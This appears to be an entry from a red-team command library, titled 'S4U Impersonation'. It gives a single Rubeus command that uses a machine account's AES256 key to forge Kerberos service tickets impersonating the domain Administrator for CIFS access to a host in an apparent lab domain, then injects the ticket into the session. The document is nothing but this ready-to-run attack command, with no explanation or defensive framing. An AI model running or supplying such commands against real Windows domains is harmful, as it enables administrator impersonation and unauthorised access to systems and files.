---
id: 25653cfe-2547-40cd-b9e1-afa773a80b7c
name: S4U Impersonation
type: command
executor: bash
data: .\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F
  /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap
  /ptt
output: null
created_at: '2023-04-06T03:56:05.672776+00:00'
updated_at: '2023-04-10T20:36:04.063259+00:00'
---

# S4U Impersonation

```bash
.\Rubeus.exe s4u /user:WVLFLLKZ$ /aes256:E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F /impersonateuser:Administrator /msdsspn:host/pc1.purple.lab /altservice:cifs /nowrap /ptt
```


